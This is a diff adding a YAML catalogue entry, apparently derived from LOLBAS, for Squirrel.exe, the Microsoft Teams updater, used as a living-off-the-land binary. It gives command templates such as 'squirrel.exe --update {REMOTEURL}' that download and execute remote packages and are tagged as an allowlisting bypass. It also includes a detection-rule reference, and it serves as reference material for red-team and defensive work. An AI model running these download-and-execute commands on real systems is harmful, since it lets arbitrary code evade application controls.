@@ -1,0 +1,121 @@
+id: lolbas/T3RoZXJNU0JpbmFyaWVzL1NxdWlycmVsLnltbA/QVdMIEJ5cGFzcw/1
+type: binary
+platform: windows
+name: Squirrel.exe
+phases:
+- defense-evasion
+- execution
+capabilities:
+- defense-evasion
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1218
+opsec:
+  noise: medium
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml
+commands:
+- template: squirrel.exe --update {REMOTEURL}
+  comment: The above binary will go to url and look for RELEASES file, download and install the nuget
+    package.
+references:
+- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Squirrel/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Squirrel.exe
+      category: AWL Bypass
+      privileges: User
+      mitre_id: T1218
+      source_file: OtherMSBinaries/Squirrel.yml
+      command_source_index: 1
+      document_utf8: "---\nName: Squirrel.exe\nDescription: Binary to update the existing installed Nuget/squirrel\
+        \ package. Part of Microsoft Teams installation.\nAuthor: 'Reegun J (OCBC Bank) - @reegun21'\n\
+        Created: 2019-06-26\nCommands:\n  - Command: squirrel.exe --download {REMOTEURL}\n    Description:\
+        \ The above binary will go to url and look for RELEASES file and download the nuget package.\n\
+        \    Usecase: Download binary\n    Category: Download\n    Privileges: User\n    MitreID: T1218\n\
+        \    OperatingSystem: Windows 7 and up with Microsoft Teams installed\n  - Command: squirrel.exe\
+        \ --update {REMOTEURL}\n    Description: The above binary will go to url and look for RELEASES\
+        \ file, download and install the nuget package.\n    Usecase: Download and execute binary\n  \
+        \  Category: AWL Bypass\n    Privileges: User\n    MitreID: T1218\n    OperatingSystem: Windows\
+        \ 7 and up with Microsoft Teams installed\n    Tags:\n      - Execute: Nuget\n      - Execute:\
+        \ Remote\n  - Command: squirrel.exe --update {REMOTEURL}\n    Description: The above binary will\
+        \ go to url and look for RELEASES file, download and install the nuget package.\n    Usecase:\
+        \ Download and execute binary\n    Category: Execute\n    Privileges: User\n    MitreID: T1218\n\
+        \    OperatingSystem: Windows 7 and up with Microsoft Teams installed\n    Tags:\n      - Execute:\
+        \ Nuget\n      - Execute: Remote\n  - Command: squirrel.exe --updateRollback={REMOTEURL}\n   \
+        \ Description: The above binary will go to url and look for RELEASES file, download and install\
+        \ the nuget package.\n    Usecase: Download and execute binary\n    Category: AWL Bypass\n   \
+        \ Privileges: User\n    MitreID: T1218\n    OperatingSystem: Windows 7 and up with Microsoft Teams\
+        \ installed\n    Tags:\n      - Execute: Nuget\n      - Execute: Remote\n  - Command: squirrel.exe\
+        \ --updateRollback={REMOTEURL}\n    Description: The above binary will go to url and look for\
+        \ RELEASES file, download and install the nuget package.\n    Usecase: Download and execute binary\n\
+        \    Category: Execute\n    Privileges: User\n    MitreID: T1218\n    OperatingSystem: Windows\
+        \ 7 and up with Microsoft Teams installed\n    Tags:\n      - Execute: Nuget\n      - Execute:\
+        \ Remote\nFull_Path:\n  - Path: 'C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Teams\\current\\\
+        Squirrel.exe'\nCode_Sample:\n  - Code: https://github.com/jreegun/POC-s/tree/master/nuget-squirrel\n\
+        Detection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml\n\
+        Resources:\n  - Link: https://www.youtube.com/watch?v=rOP3hnkj7ls\n  - Link: https://twitter.com/reegun21/status/1144182772623269889\n\
+        \  - Link: http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/\n  - Link: https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12\n\
+        \  - Link: https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56\n\
+        Acknowledgement:\n  - Person: Reegun J (OCBC Bank)\n    Handle: '@reegun21'\n  - Person: Adam\n\
+        \    Handle: '@Hexacorn'\n"
+      document_sha256: sha256:e43fb0e9f1cd9ca47455094695a8f49b80cf1d2d9f25a38ee7d6cef784136d51
+    upstream_url: https://lolbas-project.github.io/lolbas/OtherMSBinaries/Squirrel/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: defense-evasion
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: defense-evasion
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  - value: execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1218
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:fd865f3585aba3df04448cc52955594629cdc07fe93eb73b89173efdcf321ef9
